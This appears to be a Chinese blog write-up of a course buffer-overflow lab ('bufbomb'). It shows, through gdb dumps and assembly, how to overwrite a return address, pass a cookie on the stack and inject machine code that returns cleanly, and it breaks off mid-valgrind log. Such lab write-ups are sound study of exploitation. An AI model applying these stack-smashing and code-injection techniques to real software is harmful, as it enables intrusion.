<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">(gdb) x /<span class="number">20x</span> $<span class="literal">rsp</span></div><div class="line"><span class="number">0x7fffffffb8c0</span>: <span class="number">0xaaaaaaaa</span>  <span class="number">0xaaaaaaaa</span>  <span class="number">0xaaaaaaaa</span>  <span class="number">0xaaaaaaaa</span></div><div class="line"><span class="number">0x7fffffffb8d0</span>: <span class="number">0x00607f00</span>  <span class="number">0x00000000</span>  <span class="number">0x9e2148e5</span>  <span class="number">0x00000037</span></div><div class="line"><span class="number">0x7fffffffb8e0</span>: <span class="number">0x00002c80</span>  <span class="number">0x00000000</span>  <span class="number">0x9e6ba477</span>  <span class="number">0x00000037</span></div><div class="line"><span class="number">0x7fffffffb8f0</span>: <span class="number">0xffffb920</span>  <span class="number">0x00007fff</span>  <span class="number">0x00400ef3</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb900</span>: <span class="number">0xffffb930</span>  <span class="number">0x00007fff</span>  <span class="number">0xdeadbeef</span>  <span class="number">0x00000000</span></div></pre></td></tr></table></figure>


<p>32个a有木有！再看<code>%rbp</code>在<code>0x7fffffffb8f0</code>，那后面<code>%rbp+8</code>那个位置就是return addr了吧！我们看看反编译的代码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="input"><span class="prompt">objdump -d ./bufbomb &gt;</span> bufbomb.s</span></div><div class="line"> </div><div class="line">  <span class="number">400</span><span class="symbol">eee:</span>       e8 ad fe ff ff          callq  <span class="number">400</span>da<span class="number">0</span> &lt;getbuf&gt;</div><div class="line">  <span class="number">400</span><span class="symbol">ef3:</span>       <span class="number">48</span> <span class="number">83</span> f8 <span class="number">28</span>             cmp    <span class="variable">$0x28</span>,%rax</div></pre></td></tr></table></figure>


<p>果然如此啊！这道题的要求是跳转到<code>smoke</code>这个函数，同理在bufbomb.s里找一下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">00000000004010c0 &lt;smoke&gt;:</div><div class="line">  4010c0:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x8,%<span class="literal">rsp</span></div><div class="line">  4010c4:       bf <span class="number">45</span> <span class="number">13</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x401345,%<span class="literal">edi</span></div><div class="line">  4010c9:       c7 <span class="number">05</span> <span class="pseudo">dd</span> <span class="number">11</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x0,<span class="number">0x2011dd</span>(%<span class="literal">rip</span>)        # 6022b0 &lt;check_level&gt;</div><div class="line">  4010d0:       <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </div><div class="line">  4010d3:       e8 <span class="number">08</span> f7 ff ff          callq  4007e0 &lt;puts@plt&gt;</div><div class="line">  4010d8:       <span class="number">31</span> ff                   <span class="keyword">xor</span>    %<span class="literal">edi</span>,%<span class="literal">edi</span></div><div class="line">  4010da:       e8 <span class="number">51</span> fd ff ff          callq  400e30 &lt;validate&gt;</div><div class="line">  4010df:       <span class="number">31</span> ff                   <span class="keyword">xor</span>    %<span class="literal">edi</span>,%<span class="literal">edi</span></div><div class="line">  4010e1:       e8 da f7 ff ff          callq  4008c0 &lt;exit@plt&gt;</div><div class="line">  4010e6:       <span class="number">66</span> 2e 0f 1f <span class="number">84</span> <span class="number">00</span> <span class="number">00</span>    nopw   %<span class="literal">cs</span>:<span class="number">0x0</span>(%<span class="literal">rax</span>,%<span class="literal">rax</span>,<span class="number">1</span>)</div><div class="line">  4010ed:       <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></div></pre></td></tr></table></figure>


<p>所以只要改成<code>0x004010c0</code>就可以啦！前面56个字节任意，然后小心地填入 <code>c0 10 40 00</code> 作为最后四个字节，这关就过啦！</p>
<h3 id="fizz">fizz</h3>
<p>这一关跟上一关大同小异，换了一个函数<code>fizz</code>，多了个条件要传参数（用户id生成的cookie）进去！课上老师说过，x86-64前6个参数都是直接从寄存器传，之后才动用到stack上的地址，恩然后这个需要修改的参数正好是第七个。我们可以沿用上面的注入代码，只要改一下地址变成<code>fizz</code>的地址<code>0x00401070</code>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">(gdb) b fizz</div><div class="line">(gdb) r -u <span class="number">4999723</span> &lt; exploit.bytes </div><div class="line">Starting program: /home/auser/course-materials/lab3/bufbomb -u <span class="number">4999723</span> &lt; exploit.bytes</div><div class="line"><span class="label">Username:</span> <span class="number">4999723</span></div><div class="line">ce</div><div class="line">e2</div><div class="line"><span class="number">32</span></div><div class="line"><span class="number">31</span></div><div class="line"><span class="number">3</span></div><div class="line">a5</div><div class="line"><span class="number">41</span></div><div class="line">1f</div><div class="line"><span class="label">Cookie:</span> <span class="number">0x1f41a5033132e2ce</span></div><div class="line"> </div><div class="line">Breakpoint <span class="number">2</span>, fizz (arg1=<span class="number">171</span>, arg2=-<span class="number">93</span> <span class="string">'\243'</span>, arg3=<span class="number">8</span>, arg4=<span class="number">0x24</span> &lt;Address <span class="number">0x24</span> <span class="keyword">out</span> of bounds&gt;, arg5=-<span class="number">18304</span>, arg6=<span class="number">0</span>, </div><div class="line">    val=<span class="number">3735928559</span>) <span class="preprocessor">at</span> bufbomb.c:<span class="number">73</span></div><div class="line"> </div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function fizz:</div><div class="line">=&gt; <span class="number">0x0000000000401070</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">sub</span>    <span class="number">$0</span>x8,%<span class="literal">rsp</span></div><div class="line">   <span class="number">0x0000000000401074</span> &lt;+<span class="number">4</span>&gt;: movl   <span class="number">$0</span>x1,<span class="number">0x201232</span>(%<span class="literal">rip</span>)        # <span class="number">0x6022b0</span> &lt;check_level&gt;</div><div class="line">   <span class="number">0x000000000040107e</span> &lt;+<span class="number">14</span>&gt;:    <span class="keyword">mov</span>    <span class="number">0x10</span>(%<span class="literal">rsp</span>),%<span class="literal">rsi</span></div><div class="line">   <span class="number">0x0000000000401083</span> &lt;+<span class="number">19</span>&gt;:    <span class="keyword">cmp</span>    <span class="number">0x201296</span>(%<span class="literal">rip</span>),%<span class="literal">rsi</span>        # <span class="number">0x602320</span> &lt;cookie&gt;</div><div class="line">   <span class="number">0x000000000040108a</span> &lt;+<span class="number">26</span>&gt;:    <span class="keyword">je</span>     <span class="number">0x40109f</span> &lt;fizz+<span class="number">47</span>&gt;</div><div class="line">   <span class="number">0x000000000040108c</span> &lt;+<span class="number">28</span>&gt;:    <span class="keyword">mov</span>    <span class="number">$0</span>x4015b0,%<span class="literal">edi</span></div><div class="line">   <span class="number">0x0000000000401091</span> &lt;+<span class="number">33</span>&gt;:    <span class="keyword">xor</span>    %<span class="number">eax</span>,%<span class="number">eax</span></div><div class="line">   <span class="number">0x0000000000401093</span> &lt;+<span class="number">35</span>&gt;:    callq  <span class="number">0x4007f0</span> &lt;printf@plt&gt;</div><div class="line">   <span class="number">0x0000000000401098</span> &lt;+<span class="number">40</span>&gt;:    <span class="keyword">xor</span>    %<span class="literal">edi</span>,%<span class="literal">edi</span></div><div class="line">   <span class="number">0x000000000040109a</span> &lt;+<span class="number">42</span>&gt;:    callq  <span class="number">0x4008c0</span> &lt;exit@plt&gt;</div><div class="line">   <span class="number">0x000000000040109f</span> &lt;+<span class="number">47</span>&gt;:    <span class="keyword">mov</span>    <span class="number">$0</span>x401590,%<span class="literal">edi</span></div><div class="line">   <span class="number">0x00000000004010a4</span> &lt;+<span class="number">52</span>&gt;:    <span class="keyword">xor</span>    %<span class="number">eax</span>,%<span class="number">eax</span></div><div class="line">   <span class="number">0x00000000004010a6</span> &lt;+<span class="number">54</span>&gt;:    callq  <span class="number">0x4007f0</span> &lt;printf@plt&gt;</div><div class="line">   <span class="number">0x00000000004010ab</span> &lt;+<span class="number">59</span>&gt;:    <span class="keyword">mov</span>    <span class="number">$0</span>x1,%<span class="literal">edi</span></div><div class="line">   <span class="number">0x00000000004010b0</span> &lt;+<span class="number">64</span>&gt;:    callq  <span class="number">0x400e30</span> &lt;validate&gt;</div><div class="line">   <span class="number">0x00000000004010b5</span> &lt;+<span class="number">69</span>&gt;:    <span class="keyword">jmp</span>    <span class="number">0x401098</span> &lt;fizz+<span class="number">40</span>&gt;</div><div class="line">End of assembler dump.</div><div class="line"> </div><div class="line">(gdb) i r</div><div class="line"><span class="literal">rax</span>            <span class="number">0x8</span>  <span class="number">8</span></div><div class="line"><span class="literal">rbx</span>            <span class="number">0x497746be</span>   <span class="number">1232553662</span></div><div class="line"><span class="literal">rcx</span>            <span class="number">0x24</span> <span class="number">36</span></div><div class="line"><span class="literal">rdx</span>            <span class="number">0x8</span>  <span class="number">8</span></div><div class="line"><span class="literal">rsi</span>            <span class="number">0x7fffffffb8a3</span>   <span class="number">140737488337059</span></div><div class="line"><span class="literal">rdi</span>            <span class="number">0xab</span> <span class="number">171</span></div><div class="line"><span class="literal">rbp</span>            <span class="number">0xabababababababab</span>   <span class="number">0xabababababababab</span></div><div class="line"><span class="literal">rsp</span>            <span class="number">0x7fffffffb900</span>   <span class="number">0x7fffffffb900</span></div><div class="line"><span class="literal">r8</span>             <span class="number">0x7fffffffb880</span>   <span class="number">140737488337024</span></div><div class="line"><span class="literal">r9</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">r10</span>            <span class="number">0x22</span> <span class="number">34</span></div><div class="line"><span class="literal">r11</span>            <span class="number">0x246</span>    <span class="number">582</span></div><div class="line"><span class="literal">r12</span>            <span class="number">0x607f80</span> <span class="number">6324096</span></div><div class="line"><span class="literal">r13</span>            <span class="number">0x7fffffffe6f0</span>   <span class="number">140737488348912</span></div><div class="line"><span class="literal">r14</span>            <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">r15</span>            <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">rip</span>            <span class="number">0x401070</span> <span class="number">0x401070</span> &lt;fizz&gt;</div><div class="line">eflags         <span class="number">0x246</span>    [ PF ZF IF ]</div><div class="line"><span class="literal">cs</span>             <span class="number">0x33</span> <span class="number">51</span></div><div class="line"><span class="literal">ss</span>             <span class="number">0x2b</span> <span class="number">43</span></div><div class="line"><span class="literal">ds</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">es</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">fs</span>             <span class="number">0x0</span>  <span class="number">0</span></div><div class="line"><span class="literal">gs</span>             <span class="number">0x0</span>  <span class="number">0</span></div></pre></td></tr></table></figure>


<p>这里的关键点，先做<code>%rsp-8</code>，然后<code>mov    0x10(%rsp),%rsi</code>这里把<code>%rsp+0x10</code>的内容放到<code>%rsi</code>里，后面就是用这个值去跟cookie比较了！我们来看下正确的cookie是啥：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x /<span class="number">2x</span> <span class="number">0x602320</span></div><div class="line"><span class="number">0x602320</span> &lt;cookie&gt;:  <span class="number">0x3132e2ce</span>  <span class="number">0x1f41a503</span></div></pre></td></tr></table></figure>


<p>而我们传进去的cookie参数呢：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p /x <span class="variable">$rsi</span></div><div class="line"><span class="variable">$3</span> = <span class="number">0</span>xdeadbeef</div></pre></td></tr></table></figure>


<p>死去的牛肉……是不是有点眼熟？其实算一下也就知道它应该是<code>%rsp-0x08+0x10 = 0x7fffffffb908</code>，在上一题中我们已经看到那个位置存的就是deadbeef啦！然后就是修改注入信息，把它一直覆盖到正确的cookie值也被写入stack空间即可！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) p /x $<span class="literal">rsi</span></div><div class="line"><span class="number">$1</span> = <span class="number">0x1f41a5033132e2ce</span></div><div class="line">(gdb) x /<span class="number">2x</span> <span class="number">0x602320</span></div><div class="line"><span class="number">0x602320</span> &lt;cookie&gt;:  <span class="number">0x3132e2ce</span>  <span class="number">0x1f41a503</span></div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string: Fizz!: You called fizz(<span class="number">0x1f41a5033132e2ce</span>)</div></pre></td></tr></table></figure>


<p>帅气！</p>
<h3 id="bang">bang</h3>
<p>这关开始就不是简单的修改内容，而是要注入机器指令了！流程就是先进入<code>getbuf</code> -&gt; 修改return addr到stack上的地址 -&gt; 跑stack上你注入的machine code -&gt; 修改<code>global_value</code>后return到<code>bang</code>函数里去做验证。先看下我们之前的注入：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">(gdb) x /<span class="number">20x</span> $<span class="literal">rsp</span></div><div class="line"><span class="number">0x7fffffffb8c0</span>: <span class="number">0xaaaaaaaa</span>  <span class="number">0xaaaaaaaa</span>  <span class="number">0xaaaaaaaa</span>  <span class="number">0xaaaaaaaa</span></div><div class="line"><span class="number">0x7fffffffb8d0</span>: <span class="number">0x00607f00</span>  <span class="number">0x00000000</span>  <span class="number">0x9e2148e5</span>  <span class="number">0x00000037</span></div><div class="line"><span class="number">0x7fffffffb8e0</span>: <span class="number">0x00002c80</span>  <span class="number">0x00000000</span>  <span class="number">0x9e6ba477</span>  <span class="number">0x00000037</span></div><div class="line"><span class="number">0x7fffffffb8f0</span>: <span class="number">0xffffb920</span>  <span class="number">0x00007fff</span>  <span class="number">0x00400ef3</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb900</span>: <span class="number">0xffffb930</span>  <span class="number">0x00007fff</span>  <span class="number">0xdeadbeef</span>  <span class="number">0x00000000</span></div></pre></td></tr></table></figure>


<p>这里返回地址是<code>0x400ef3</code>，而我们需要它去执行stack上的代码，可以修改返回地址到<code>0x7fffffffb900</code>，然后从那里开始我们就要填入修改<code>global_value</code>的机器代码了！就这么来吧！先写汇编并生成机器码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># as.s</span></div><div class="line">movq <span class="number">0x602320</span>,%rax      <span class="comment"># 正确Cookie所在的位置，放到%rax</span></div><div class="line">movq %rax,<span class="number">0x602308</span>      <span class="comment"># 再放到global_value所在地址</span></div><div class="line">pushq $<span class="number">0x401020</span>         <span class="comment"># 返回地址为bang函数的入口地址</span></div><div class="line">retq                    <span class="comment"># 返回！</span></div><div class="line"> </div><div class="line">gcc -c <span class="keyword">as</span>.s</div><div class="line">objdump -d <span class="keyword">as</span>.o &gt; <span class="keyword">as</span>.d</div><div class="line"> </div><div class="line"><span class="keyword">as</span>.o:     <span class="built_in">file</span> <span class="built_in">format</span> elf64-x86-<span class="number">64</span></div><div class="line"> </div><div class="line">Disassembly <span class="operator">of</span> section .<span class="keyword">text</span>:</div><div class="line"> </div><div class="line"><span class="number">0000000000000000</span> &lt;.<span class="keyword">text</span>&gt;:</div><div class="line">   <span class="number">0</span>:   <span class="number">48</span> <span class="number">8</span>b <span class="number">04</span> <span class="number">25</span> <span class="number">20</span> <span class="number">23</span> <span class="number">60</span>    mov    <span class="number">0x602320</span>,%rax</div><div class="line">   <span class="number">7</span>:   <span class="number">00</span> </div><div class="line">   <span class="number">8</span>:   <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> <span class="number">08</span> <span class="number">23</span> <span class="number">60</span>    mov    %rax,<span class="number">0x602308</span></div><div class="line">   f:   <span class="number">00</span> </div><div class="line">  <span class="number">10</span>:   <span class="number">68</span> <span class="number">20</span> <span class="number">10</span> <span class="number">40</span> <span class="number">00</span>          pushq  $<span class="number">0x401020</span></div><div class="line">  <span class="number">15</span>:   c3                      retq</div></pre></td></tr></table></figure>


<p>然后把这段代码通过相同方法小心地放到目的地址……记得修改原来栈上的return addr。大功告成！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"><span class="keyword">Type</span> <span class="keyword">string</span>: Bang!: You <span class="keyword">set</span> global_value <span class="keyword">to</span> <span class="number">0</span>x1f41a5033132e2ce</div></pre></td></tr></table></figure>


<h3 id="dynamite">dynamite</h3>
<p>这关是附加题，在上一题的基础上加了个要求，就是在完成注入，修改完cookie后还要复原现场，返回原先调用<code>getbuf</code>的函数去。这关真是各种曲折，先修改前面那个<code>pushq</code>好让跑完我的注入代码后回到<code>test</code>函数（也就是getbuf的调用者）去，然后发现程序会去检查那个deadbeef还在不在，cookie是不是正确设置成了用户的cookie等。最直观的做法就是跳过原先存放<code>%rbp</code>还有那个deadbeef的位置再注入代码，在代码里修改<code>getbuf</code>返回值，然后再跳回<code>test</code>函数，的确可以通过。修改过的汇编如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">0000000000000000</span> &lt;.<span class="keyword">text</span>&gt;:</div><div class="line">   <span class="number">0</span>:   <span class="number">48</span> b8 ce e2 <span class="number">32</span> <span class="number">31</span> <span class="number">03</span>    movabs <span class="variable">$0</span>x1f41a5033132e2ce,<span class="variable">%rax</span></div><div class="line">   <span class="number">7</span>:   a5 <span class="number">41</span> <span class="number">1</span>f </div><div class="line">   a:   <span class="number">68</span> f3 <span class="number">0</span>e <span class="number">40</span> <span class="number">00</span>          pushq  <span class="variable">$0</span>x400ef3</div><div class="line">   f:   c3                      retq</div></pre></td></tr></table></figure>


<p>注入之后的内存情况：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">(gdb) x /<span class="number">32x</span> $<span class="literal">rsp</span></div><div class="line"><span class="number">0x7fffffffb8c0</span>: <span class="number">0x00000000</span>  <span class="number">0x00000000</span>  <span class="number">0x00000000</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb8d0</span>: <span class="number">0x00000000</span>  <span class="number">0x00000000</span>  <span class="number">0x00000000</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb8e0</span>: <span class="number">0x00000000</span>  <span class="number">0x00000000</span>  <span class="number">0x00000000</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb8f0</span>: <span class="number">0xffffb920</span>  <span class="number">0x00007fff</span>  <span class="number">0xffffb930</span>  <span class="number">0x00007fff</span></div><div class="line"><span class="number">0x7fffffffb900</span>: <span class="number">0xffffb930</span>  <span class="number">0x00007fff</span>  <span class="number">0xdeadbeef</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb910</span>: <span class="number">0x199b0120</span>  <span class="number">0x00000037</span>  <span class="number">0x497746be</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb920</span>: <span class="number">0xffffe5e0</span>  <span class="number">0x00007fff</span>  <span class="number">0x00400fdd</span>  <span class="number">0x00000000</span></div><div class="line"><span class="number">0x7fffffffb930</span>: <span class="number">0xe2ceb848</span>  <span class="number">0xa5033132</span>  <span class="number">0xf3681f41</span>  <span class="number">0xc300400e</span></div></pre></td></tr></table></figure>


<p>注意上面我从<code>0x7fffffffb930</code>才开始放代码，<code>0x7fffffffb8f8</code>处的return addr也做了相应的修改。虽然本地通过了测试，但是提交后总是0分……于是我又去看bufbomb的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">"gt:u:"</span>)) != -<span class="number">1</span>)</div><div class="line">      <span class="keyword">switch</span>(c) {</div><div class="line">      <span class="keyword">case</span> <span class="string">'g'</span>: <span class="comment">/* Hidden switch */</span></div><div class="line">        grade = <span class="number">1</span>;</div><div class="line">        quiet = <span class="number">1</span>;</div><div class="line">        alarm_time = <span class="number">1</span>; <span class="comment">/* Should get immediate response */</span></div><div class="line">        <span class="keyword">break</span>;</div></pre></td></tr></table></figure>


<p>难道是提交后打分用了-g参数？再试了下果然会有segmentation fault出现。难道是我注入的代码破坏了之前push进去的某些内容？然后我又试着在原来<code>0x7fffffffb900</code>的位置注入代码，在代码里把deadbeef搞回去：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">0000000000000000</span> &lt;.<span class="keyword">text</span>&gt;:</div><div class="line">   <span class="number">0</span>:   <span class="number">48</span> b8 ce e2 <span class="number">32</span> <span class="number">31</span> <span class="number">03</span>    movabs <span class="variable">$0</span>x1f41a5033132e2ce,<span class="variable">%rax</span></div><div class="line">   <span class="number">7</span>:   a5 <span class="number">41</span> <span class="number">1</span>f </div><div class="line">   a:   <span class="number">68</span> f3 <span class="number">0</span>e <span class="number">40</span> <span class="number">00</span>          pushq  <span class="variable">$0</span>x400ef3</div><div class="line">   f:   <span class="number">49</span> ba ef be ad de <span class="number">00</span>    movabs <span class="variable">$0</span>xdeadbeef,<span class="variable">%r10</span></div><div class="line">  <span class="number">16</span>:   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </div><div class="line">  <span class="number">19</span>:   <span class="number">4</span>c <span class="number">89</span> <span class="number">55</span> e8             mov    <span class="variable">%r10</span>,-<span class="number">0x18</span>(<span class="variable">%rbp</span>)</div><div class="line">  <span class="number">1</span>d:   c3                      retq</div></pre></td></tr></table></figure>


<p>跑了一下gdb，这下无论加还是不加-g都能通过了！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">(gdb) r -u <span class="number">4999723</span> -g &lt; dynamite.bytes </div><div class="line">Starting program: /home/auser/course-materials/lab3/bufbomb -u <span class="number">4999723</span> -g &lt; dynamite.bytes</div><div class="line"><span class="label">Username:</span> <span class="number">4999723</span></div><div class="line">ce</div><div class="line">e2</div><div class="line"><span class="number">32</span></div><div class="line"><span class="number">31</span></div><div class="line"><span class="number">3</span></div><div class="line">a5</div><div class="line"><span class="number">41</span></div><div class="line">1f</div><div class="line"><span class="label">Cookie:</span> <span class="number">0x1f41a5033132e2ce</span></div><div class="line">Boom!: getbuf returned <span class="number">0x1f41a5033132e2ce</span></div><div class="line">Level <span class="number">3</span> VALID</div><div class="line">[Inferior <span class="number">1</span> (process <span class="number">12692</span>) exited normally]</div></pre></td></tr></table></figure>


<p>但是提交后还是不行！不用gdb试着跑了下……果然还是有segmentation fault！怒了，设core file size为unlimited，再跑！没有core？一看源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Signal handler to catch segmentation violations */</span></div><div class="line"><span class="keyword">void</span> seghandler(<span class="keyword">int</span> sig)</div><div class="line">{</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Ouch!: You caused a segmentation fault!\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Better luck next time\n"</span>);</div><div class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">}</div></pre></td></tr></table></figure>


<p>我去，竟然拦截了信号量不生成core file。修改代码再编译……发现原来这个代码不完整，没有头文件之类的……还好我们还有神器！祭出<code>valgrind</code>！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">bash-4.2$ valgrind ./bufbomb -g -u 4999723 &lt; exploit.bytes </div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">Memcheck</span>, a memory error detector</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">Copyright</span> (<span class="constant">C</span>) <span class="number">2002</span>-<span class="number">2012</span>, <span class="keyword">and</span> <span class="constant">GNU</span> <span class="constant">GPL</span><span class="string">'d, by Julian Seward et al.</span></span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">Using</span> <span class="constant">Valgrind</span>-<span class="number">3.8</span>.<span class="number">1</span> <span class="keyword">and</span> <span class="constant">LibVEX</span>; rerun with -h <span class="keyword">for</span> copyright info</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">Command</span><span class="symbol">:</span> ./bufbomb -g -u <span class="number">4999723</span></span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>== </span></div><div class="line">Username: 4999723</div><div class="line">ce</div><div class="line">e2</div><div class="line">32</div><div class="line">31</div><div class="line">3</div><div class="line">a5</div><div class="line">41</div><div class="line">1f</div><div class="line">Cookie: 0x1f41a5033132e2ce</div><div class="line">=<span class="ruby">=<span class="number">14149</span>== <span class="constant">Jump</span> to the invalid address stated on the <span class="keyword">next</span> line</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    at <span class="number">0x7FFFFFFFB900</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0xA5033132E2CEB847</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0x4900400EF3681F40</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0xDEADBEEFB9</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0xC3E855894BFF</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0x7FF00059F</span><span class="symbol">:</span> ???</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span class="number">0x400FDC</span><span class="symbol">:</span> launch.isra.<span class="number">1</span> (bufbomb.<span class="symbol">c:</span><span class="number">343</span>)</span></div><div class="line">=<span class="ruby">=<span class="number">14149</span>==    by <span 